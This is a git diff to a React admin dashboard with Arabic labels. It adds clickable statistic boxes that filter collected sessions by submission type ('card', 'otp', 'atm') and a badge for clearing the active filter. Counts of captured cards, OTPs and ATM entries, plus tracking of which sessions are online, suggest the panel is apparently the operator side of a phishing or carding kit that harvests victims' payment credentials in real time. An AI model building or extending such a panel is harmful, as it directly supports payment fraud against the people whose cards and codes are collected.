@@ -766,6 +766,9 @@ export default function AdminDashboard() {
   // Filter: show only online sessions
   const [showOnlineOnly, setShowOnlineOnly] = useState(false);
 
+  // Stats filter: filter sessions by type when clicking on stat boxes
+  const [statsFilter, setStatsFilter] = useState<string | null>(null);
+
   const sessions = useMemo(() => {
     const trashedIds = new Set(trashItems.map((item) => item.id));
     const grouped: Record<string, SubmissionRow[]> = {};
@@ -799,23 +802,41 @@ export default function AdminDashboard() {
 
   // Filtered sessions based on online status
   const filteredSessions = useMemo(() => {
-    if (!showOnlineOnly) return sessions;
+    let result = sessions;
     
-    const onlineSessionIds = new Set(
-      Object.values(trackingInfo)
-        .filter((info) => info.isOnline)
-        .map((info) => info.sessionId)
-    );
+    // Filter by stats type (card, otp, atm)
+    if (statsFilter) {
+      const filterFn = (rows: SubmissionRow[]) => {
+        if (statsFilter === "card") {
+          return rows.some((r) => r.type === "card");
+        }
+        if (statsFilter === "otp") {
+          return rows.some((r) => r.type.startsWith("otp"));
+        }
+        if (statsFilter === "atm") {
+          return rows.some((r) => r.type === "atm");
+        }
+        return true;
+      };
+      result = Object.fromEntries(
+        Object.entries(result).filter(([, rows]) => filterFn(rows))
+      );
+    }
     
-    const filtered: typeof sessions = {};
-    Object.entries(sessions).forEach(([sessionId, rows]) => {
-      if (onlineSessionIds.has(sessionId)) {
-        filtered[sessionId] = rows;
-      }
-    });
+    // Filter by online status
+    if (showOnlineOnly) {
+      const onlineSessionIds = new Set(
+        Object.values(trackingInfo)
+          .filter((info) => info.isOnline)
+          .map((info) => info.sessionId)
+      );
+      result = Object.fromEntries(
+        Object.entries(result).filter(([sessionId]) => onlineSessionIds.has(sessionId))
+      );
+    }
     
-    return filtered;
-  }, [sessions, trackingInfo, showOnlineOnly]);
+    return result;
+  }, [sessions, trackingInfo, showOnlineOnly, statsFilter]);
 
   // Count of online sessions for display
   const onlineSessionCount = useMemo(() => {
@@ -1212,22 +1233,34 @@ export default function AdminDashboard() {
           <div className="space-y-4">
             <h2 className="text-lg font-bold text-slate-900">📊 الإحصائيات</h2>
             <div className="grid grid-cols-2 gap-3">
-              <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center">
+              <button
+                onClick={() => { setActiveSection("sessions"); setStatsFilter(null); }}
+                className="rounded-2xl border border-slate-200 bg-white p-4 text-center hover:bg-slate-50 active:bg-slate-100"
+              >
                 <div className="text-3xl font-bold text-slate-900">{sessionCount}</div>
                 <div className="text-sm text-slate-500">الجلسات</div>
-              </div>
-              <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center">
+              </button>
+              <button
+                onClick={() => { setActiveSection("sessions"); setStatsFilter("card"); }}
+                className="rounded-2xl border border-slate-200 bg-white p-4 text-center hover:bg-red-50 active:bg-red-100"
+              >
                 <div className="text-3xl font-bold text-red-600">{cardCount}</div>
                 <div className="text-sm text-slate-500">البطاقات</div>
-              </div>
-              <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center">
+              </button>
+              <button
+                onClick={() => { setActiveSection("sessions"); setStatsFilter("otp"); }}
+                className="rounded-2xl border border-slate-200 bg-white p-4 text-center hover:bg-orange-50 active:bg-orange-100"
+              >
                 <div className="text-3xl font-bold text-orange-600">{otpCount}</div>
                 <div className="text-sm text-slate-500">OTP</div>
-              </div>
-              <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center">
+              </button>
+              <button
+                onClick={() => { setActiveSection("sessions"); setStatsFilter("atm"); }}
+                className="rounded-2xl border border-slate-200 bg-white p-4 text-center hover:bg-teal-50 active:bg-teal-100"
+              >
                 <div className="text-3xl font-bold text-teal-600">{atmCount}</div>
                 <div className="text-sm text-slate-500">ATM</div>
-              </div>
+              </button>
               <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center">
                 <div className="text-3xl font-bold text-blue-600">{pendingCount}</div>
                 <div className="text-sm text-slate-500">ينتظر</div>
@@ -1392,6 +1425,16 @@ export default function AdminDashboard() {
                 <p className="text-xs text-slate-500">{showOnlineOnly ? onlineSessionCount : sessionCount} جلسة • {cardCount} بطاقة</p>
               </div>
               <div className="flex items-center gap-2">
+                {/* Filter indicator */}
+                {statsFilter && (
+                  <button
+                    onClick={() => setStatsFilter(null)}
+                    className="px-3 py-1.5 rounded-xl text-xs font-medium bg-blue-100 text-blue-700 border border-blue-300 flex items-center gap-1"
+                  >
+                    {statsFilter === "card" ? "💳 البطاقات" : statsFilter === "otp" ? "🔢 OTP" : "🏧 ATM"}
+                    <span className="font-bold">✕</span>
+                  </button>
+                )}
                 <div className="px-3 py-1.5 rounded-xl bg-green-50 text-green-700 text-xs font-medium">
                   <span className="font-bold">{onlineCount}</span> متصل الآن
                 </div>
